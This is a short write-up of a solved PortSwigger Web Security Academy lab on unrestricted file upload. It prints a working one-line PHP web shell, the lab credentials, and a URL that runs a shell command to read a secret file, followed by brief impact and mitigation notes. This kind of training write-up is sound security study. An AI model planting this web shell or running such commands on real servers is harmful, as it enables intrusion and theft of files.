# Remote Code Execution via Web Shell Upload

**Platform:** PortSwigger Web Security Academy  
**Category:** File Upload Vulnerabilities  
**Difficulty:** Apprentice  
**Status:** Solved ✅

---

## Vulnerability

The application has a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

## Steps to Reproduce

**1. Create a PHP web shell**

```bash
nano portswiggerexploit.php
```

```php
<?php echo system($_GET['command']); ?>
```

**2. Upload the file**

Log in using the credentials `wiener:peter` and upload `portswiggerexploit.php` as a profile picture. The server accepts it without any validation.

**3. Find the file path**

Check Burp Suite HTTP history. When a website accepts a profile picture, it has to load that image from somewhere to show it to you. Using this behavior, the file path was found:

```
/files/avatars/portswiggerexploit.php
```

**4. Execute the command**

```
https://<lab-id>.web-security-academy.net/files/avatars/portswiggerexploit.php?command=cat%20/home/carlos/secret
```

## Result

```
gHDlyXs1CifvIROj5Edbky7t0wjvAGql
```

## Impact

Attacker can read local files on the server, and possibly edit/delete files. Can also perform privilege escalation.

## Mitigation

Server should not only check extensions or MIME types — it should verify files properly by checking file content. Store files somewhere safe like outside the web root. Should not allow any files without content validation.
